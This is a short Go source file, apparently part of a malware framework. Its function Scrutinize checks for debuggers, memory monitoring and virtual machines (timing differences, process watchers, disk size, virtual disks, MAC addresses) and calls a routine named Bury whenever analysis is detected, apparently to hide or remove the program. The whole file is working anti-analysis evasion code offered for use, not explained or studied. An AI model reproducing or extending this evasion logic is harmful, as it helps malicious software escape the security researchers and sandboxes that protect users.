package virt

import (
	"time"

	"github.com/whiterabb17/greatwhite/modules/roots"

	"github.com/whiterabb17/medusa/antidebug"
	"github.com/whiterabb17/medusa/antimem"
	"github.com/whiterabb17/medusa/antivm"
)

func Scrutinize(s int) {
	var size uint64
	size = uint64(s)
	initTime := time.Now() // grab the time here
	// do your actions here
	if antidebug.ByTimmingDiff(initTime, 5) {
		roots.Bury()
	}
	if antidebug.ByProcessWatcher() {
		roots.Bury()
	}
	if antimem.ByMemWatcher() {
		roots.Bury()
	}
	if antivm.BySizeDisk(size) {
		roots.Bury()
	}
	if antivm.IsVirtualDisk() {
		roots.Bury()
	}
	if antivm.ByMacAddress() {
		roots.Bury()
	}
}
